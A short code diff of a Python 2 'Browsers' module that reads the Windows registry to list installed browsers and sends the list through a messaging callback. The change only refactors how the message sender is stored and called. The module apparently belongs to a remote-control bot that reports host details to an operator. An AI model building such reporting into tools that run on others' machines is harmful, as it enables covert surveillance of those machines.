@@ -1,8 +1,8 @@
 from _winreg import *
 class Browsers():
 	def __init__(self, _):
+		self._ = _
 		self.args = _.args
-		self.Send_Message = _.Send_Message
 		self.Main()
 
 	def Main(self):
@@ -19,4 +19,4 @@ class Browsers():
 					break
 				browsers += "%E2%9D%96 " + borwser + "\n"
 		browsers = browsers.replace("\n\n","\n")
-		self.Send_Message.Send(browsers)
+		self._.Send_Message(browsers)
